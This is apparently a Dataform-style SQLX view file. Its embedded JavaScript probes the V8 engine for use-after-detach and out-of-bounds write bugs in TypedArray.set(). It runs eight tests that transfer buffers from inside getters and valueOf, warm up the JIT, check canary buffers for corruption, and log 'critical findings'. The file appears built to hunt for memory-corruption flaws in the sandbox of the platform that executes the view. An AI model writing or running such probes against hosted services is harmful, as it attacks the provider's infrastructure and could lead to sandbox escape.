config { type: "view", name: "v8_set_arraylike_exploit" }

js {
  let results = {
    probeTime: new Date().toISOString(),
    purpose: "Exploit TypedArray.set() with array-like getter that transfers buffer"
  };

  // =============================================================================
  // TEST 1: Array-like with getters that transfer buffer
  // =============================================================================
  results.test1_getterTransfer = {};
  try {
    const buf = new ArrayBuffer(128);
    const view = new Uint8Array(buf);
    for (let i = 0; i < 128; i++) view[i] = 0xAA;

    let transferred = null;
    let accessLog = [];

    // Create array-like with indexed getters
    const evil = { length: 128 };
    for (let i = 0; i < 128; i++) {
      const idx = i;
      Object.defineProperty(evil, idx, {
        get() {
          accessLog.push(idx);
          if (idx === 32 && !transferred) {
            transferred = buf.transfer();
          }
          return 0xDD;
        },
        enumerable: true
      });
    }

    let error = null;
    try {
      view.set(evil);
    } catch(e) {
      error = e.message.substring(0, 100);
    }

    // Check results
    const newBufView = transferred ? new Uint8Array(transferred) : null;

    results.test1_getterTransfer = {
      status: "completed",
      accessCount: accessLog.length,
      firstAccesses: accessLog.slice(0, 10),
      lastAccesses: accessLog.slice(-5),
      error,
      viewLengthAfter: view.length,
      transferred: !!transferred,
      newBufFirst16: newBufView ?
        Array.from(newBufView.slice(0, 16)).map(v => v.toString(16)) : null,
      newBufAt30_40: newBufView ?
        Array.from(newBufView.slice(30, 40)).map(v => v.toString(16)) : null
    };
  } catch(e) {
    results.test1_getterTransfer = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 2: Long array-like - try to write beyond original bounds
  // =============================================================================
  results.test2_oobWrite = {};
  try {
    const buf = new ArrayBuffer(64);
    const view = new Uint8Array(buf);
    for (let i = 0; i < 64; i++) view[i] = i;

    // Create canary buffer that might be adjacent
    const canaryBuf = new ArrayBuffer(64);
    const canaryView = new Uint8Array(canaryBuf);
    for (let i = 0; i < 64; i++) canaryView[i] = 0xCC;
    const canaryBefore = Array.from(canaryView.slice(0, 16));

    let transferred = null;
    let accessCount = 0;

    // Array-like longer than buffer
    const longEvil = { length: 256 };  // Longer than buffer!
    for (let i = 0; i < 256; i++) {
      const idx = i;
      Object.defineProperty(longEvil, idx, {
        get() {
          accessCount++;
          if (idx === 16 && !transferred) {
            transferred = buf.transfer();
          }
          return 0xEE;
        }
      });
    }

    let error = null;
    try {
      view.set(longEvil);
    } catch(e) {
      error = e.message.substring(0, 100);
    }

    const canaryAfter = Array.from(canaryView.slice(0, 16));
    const canaryChanged = canaryBefore.some((v, i) => v !== canaryAfter[i]);

    results.test2_oobWrite = {
      status: "completed",
      accessCount,
      error,
      viewLengthAfter: view.length,
      transferred: !!transferred,
      canaryBefore: canaryBefore.map(v => v.toString(16)),
      canaryAfter: canaryAfter.map(v => v.toString(16)),
      canaryChanged
    };
  } catch(e) {
    results.test2_oobWrite = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 3: set() with offset + transfer in getter
  // =============================================================================
  results.test3_offsetSet = {};
  try {
    const buf = new ArrayBuffer(128);
    const view = new Uint8Array(buf);
    for (let i = 0; i < 128; i++) view[i] = i;

    let transferred = null;
    let accessCount = 0;

    const evilWithOffset = { length: 64 };
    for (let i = 0; i < 64; i++) {
      const idx = i;
      Object.defineProperty(evilWithOffset, idx, {
        get() {
          accessCount++;
          if (idx === 16 && !transferred) {
            transferred = buf.transfer();
          }
          return 0xBB;
        }
      });
    }

    let error = null;
    try {
      // Set with offset - writes should go to indices 32-95
      view.set(evilWithOffset, 32);
    } catch(e) {
      error = e.message.substring(0, 100);
    }

    const newBufView = transferred ? new Uint8Array(transferred) : null;

    results.test3_offsetSet = {
      status: "completed",
      accessCount,
      error,
      viewLengthAfter: view.length,
      transferred: !!transferred,
      newBufAt0_8: newBufView ?
        Array.from(newBufView.slice(0, 8)).map(v => v.toString(16)) : null,
      newBufAt32_40: newBufView ?
        Array.from(newBufView.slice(32, 40)).map(v => v.toString(16)) : null,
      newBufAt48_56: newBufView ?
        Array.from(newBufView.slice(48, 56)).map(v => v.toString(16)) : null
    };
  } catch(e) {
    results.test3_offsetSet = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 4: set() from another TypedArray with detach in valueOf
  // =============================================================================
  results.test4_typedArraySource = {};
  try {
    const srcBuf = new ArrayBuffer(64);
    const srcView = new Uint8Array(srcBuf);
    for (let i = 0; i < 64; i++) srcView[i] = i + 100;

    const dstBuf = new ArrayBuffer(128);
    const dstView = new Uint8Array(dstBuf);
    for (let i = 0; i < 128; i++) dstView[i] = i;

    let transferred = null;

    // Evil offset that transfers destination buffer
    const evilOffset = {
      valueOf() {
        if (!transferred) {
          transferred = dstBuf.transfer();
        }
        return 32;
      }
    };

    let error = null;
    try {
      dstView.set(srcView, evilOffset);
    } catch(e) {
      error = e.message.substring(0, 100);
    }

    const transferredView = transferred ? new Uint8Array(transferred) : null;

    results.test4_typedArraySource = {
      status: "completed",
      error,
      transferred: !!transferred,
      dstViewLengthAfter: dstView.length,
      transferredAt0_8: transferredView ?
        Array.from(transferredView.slice(0, 8)).map(v => v.toString(16)) : null,
      transferredAt32_40: transferredView ?
        Array.from(transferredView.slice(32, 40)).map(v => v.toString(16)) : null
    };
  } catch(e) {
    results.test4_typedArraySource = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 5: set() source buffer detach
  // =============================================================================
  results.test5_srcDetach = {};
  try {
    const srcBuf = new ArrayBuffer(64);
    const srcView = new Uint8Array(srcBuf);
    for (let i = 0; i < 64; i++) srcView[i] = 0xFF - i;

    const dstBuf = new ArrayBuffer(128);
    const dstView = new Uint8Array(dstBuf);
    for (let i = 0; i < 128; i++) dstView[i] = i;

    const dstBefore = Array.from(dstView.slice(0, 16));

    let transferred = null;

    // Evil offset that detaches SOURCE buffer
    const evilOffset = {
      valueOf() {
        if (!transferred) {
          transferred = srcBuf.transfer();
        }
        return 0;
      }
    };

    let error = null;
    try {
      dstView.set(srcView, evilOffset);
    } catch(e) {
      error = e.message.substring(0, 100);
    }

    const dstAfter = Array.from(dstView.slice(0, 16));
    const dstChanged = dstBefore.some((v, i) => v !== dstAfter[i]);

    results.test5_srcDetach = {
      status: "completed",
      error,
      transferred: !!transferred,
      srcViewLengthAfter: srcView.length,
      dstBefore: dstBefore.map(v => v.toString(16)),
      dstAfter: dstAfter.map(v => v.toString(16)),
      dstChanged
    };
  } catch(e) {
    results.test5_srcDetach = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 6: Concurrent detach during overlapping set()
  // =============================================================================
  results.test6_overlappingSet = {};
  try {
    const sharedBuf = new ArrayBuffer(128);
    const view1 = new Uint8Array(sharedBuf, 0, 64);
    const view2 = new Uint8Array(sharedBuf, 32, 64);

    for (let i = 0; i < 64; i++) view1[i] = i;

    const before = Array.from(view1.slice(0, 16));

    let transferred = null;
    let accessCount = 0;

    // Create array-like that overlaps and detaches
    const evilOverlap = { length: 64 };
    for (let i = 0; i < 64; i++) {
      const idx = i;
      Object.defineProperty(evilOverlap, idx, {
        get() {
          accessCount++;
          if (idx === 16 && !transferred) {
            transferred = sharedBuf.transfer();
          }
          return view2[idx];  // Read from overlapping view
        }
      });
    }

    let error = null;
    try {
      view1.set(evilOverlap);
    } catch(e) {
      error = e.message.substring(0, 100);
    }

    const newView = transferred ? new Uint8Array(transferred) : null;

    results.test6_overlappingSet = {
      status: "completed",
      accessCount,
      error,
      transferred: !!transferred,
      view1LengthAfter: view1.length,
      newBufFirst16: newView ?
        Array.from(newView.slice(0, 16)).map(v => v.toString(16)) : null,
      newBufAt32_48: newView ?
        Array.from(newView.slice(32, 48)).map(v => v.toString(16)) : null
    };
  } catch(e) {
    results.test6_overlappingSet = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 7: JIT warmup then evil source
  // =============================================================================
  results.test7_jitEvil = {};
  try {
    function setFromSource(view, source, offset) {
      view.set(source, offset);
    }

    // JIT warmup with normal arrays
    for (let iter = 0; iter < 50000; iter++) {
      const buf = new ArrayBuffer(64);
      const view = new Uint8Array(buf);
      setFromSource(view, [1, 2, 3, 4, 5], 0);
    }

    // Now evil source
    const targetBuf = new ArrayBuffer(128);
    const targetView = new Uint8Array(targetBuf);
    for (let i = 0; i < 128; i++) targetView[i] = i;

    let transferred = null;
    let accessCount = 0;

    const jitEvil = { length: 64 };
    for (let i = 0; i < 64; i++) {
      const idx = i;
      Object.defineProperty(jitEvil, idx, {
        get() {
          accessCount++;
          if (idx === 16 && !transferred) {
            transferred = targetBuf.transfer();
          }
          return 0xAB;
        }
      });
    }

    let error = null;
    try {
      setFromSource(targetView, jitEvil, 0);
    } catch(e) {
      error = e.message.substring(0, 100);
    }

    const newView = transferred ? new Uint8Array(transferred) : null;

    results.test7_jitEvil = {
      status: "completed",
      accessCount,
      error,
      transferred: !!transferred,
      targetLengthAfter: targetView.length,
      newViewFirst16: newView ?
        Array.from(newView.slice(0, 16)).map(v => v.toString(16)) : null,
      newViewAt16_24: newView ?
        Array.from(newView.slice(16, 24)).map(v => v.toString(16)) : null
    };
  } catch(e) {
    results.test7_jitEvil = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 8: BigInt64Array set() with transfer
  // =============================================================================
  results.test8_bigInt64Set = {};
  try {
    const buf = new ArrayBuffer(128);
    const view = new BigInt64Array(buf);  // 16 elements
    for (let i = 0; i < 16; i++) view[i] = BigInt(i + 1000);

    let transferred = null;
    let accessCount = 0;

    const bigIntEvil = { length: 16 };
    for (let i = 0; i < 16; i++) {
      const idx = i;
      Object.defineProperty(bigIntEvil, idx, {
        get() {
          accessCount++;
          if (idx === 4 && !transferred) {
            transferred = buf.transfer();
          }
          return BigInt(0xDEADBEEF);
        }
      });
    }

    let error = null;
    try {
      view.set(bigIntEvil);
    } catch(e) {
      error = e.message.substring(0, 100);
    }

    const newView = transferred ? new BigInt64Array(transferred) : null;

    results.test8_bigInt64Set = {
      status: "completed",
      accessCount,
      error,
      transferred: !!transferred,
      viewLengthAfter: view.length,
      newViewFirst4: newView ?
        Array.from(newView.slice(0, 4)).map(v => v.toString(16)) : null,
      newViewAt4_8: newView ?
        Array.from(newView.slice(4, 8)).map(v => v.toString(16)) : null
    };
  } catch(e) {
    results.test8_bigInt64Set = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // SUMMARY
  // =============================================================================
  results.summary = {
    testsRun: 8,
    allCompleted: Object.keys(results).filter(k =>
      k.startsWith("test") && results[k].status === "completed"
    ).length,
    criticalFindings: []
  };

  // Analyze for interesting patterns
  for (const [name, test] of Object.entries(results)) {
    if (!name.startsWith("test")) continue;

    if (test.error === null && test.transferred && test.accessCount > 0) {
      const transferIdx = name === "test1_getterTransfer" ? 32 :
                         name === "test2_oobWrite" ? 16 :
                         name === "test3_offsetSet" ? 16 :
                         name === "test8_bigInt64Set" ? 4 : 16;
      if (test.accessCount > transferIdx) {
        results.summary.criticalFindings.push(
          `${name}: Continued ${test.accessCount - transferIdx} accesses after transfer at ${transferIdx}`
        );
      }
    }

    if (test.canaryChanged) {
      results.summary.criticalFindings.push(`${name}: CANARY CORRUPTED - OOB WRITE!`);
    }
  }
}

SELECT '${JSON.stringify(results, null, 2)}' as set_arraylike_exploit
